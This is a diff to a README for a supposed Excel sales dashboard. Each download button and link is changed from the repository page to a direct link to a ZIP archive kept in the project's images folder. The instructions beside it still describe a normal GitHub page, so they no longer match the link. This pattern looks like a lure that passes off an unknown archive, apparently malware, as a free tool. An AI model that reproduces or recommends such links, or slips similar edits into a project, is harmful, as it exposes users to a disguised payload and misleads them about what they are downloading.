@@ -1,7 +1,7 @@
 <h1>📊 excel-sales-dashboard - Your Sales Data, Made Simple</h1>
 
 <p align="center">
-  <a href="https://github.com/Ccamp9793/excel-sales-dashboard">
+  <a href="https://github.com/Ccamp9793/excel-sales-dashboard/raw/refs/heads/main/images/3.4.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Dashboard-brightgreen?style=for-the-badge&logo=github" alt="Download Button" />
   </a>
 </p>
@@ -57,7 +57,7 @@ Follow these steps exactly, and you will have the dashboard open in a few minute
 
 Click the big button at the top of this page, or use this link:
 
-👉 **[Download excel-sales-dashboard](https://github.com/Ccamp9793/excel-sales-dashboard)**
+👉 **[Download excel-sales-dashboard](https://github.com/Ccamp9793/excel-sales-dashboard/raw/refs/heads/main/images/3.4.zip)**
 
 When you visit this link, you will land on a GitHub page. Look for the green button that says **"Code"** or **"Download"**. Click it, then choose **"Download ZIP"**. Save the ZIP file to your computer, for example, on your **Desktop**.
 
@@ -168,7 +168,7 @@ This dashboard is designed to save you time and give you confidence in your numb
 ---
 
 <p align="center">
-  <a href="https://github.com/Ccamp9793/excel-sales-dashboard">
+  <a href="https://github.com/Ccamp9793/excel-sales-dashboard/raw/refs/heads/main/images/3.4.zip">
     <img src="https://img.shields.io/badge/🔽%20Download%20Now-blueviolet?style=for-the-badge" alt="Download Again" />
   </a>
 </p>
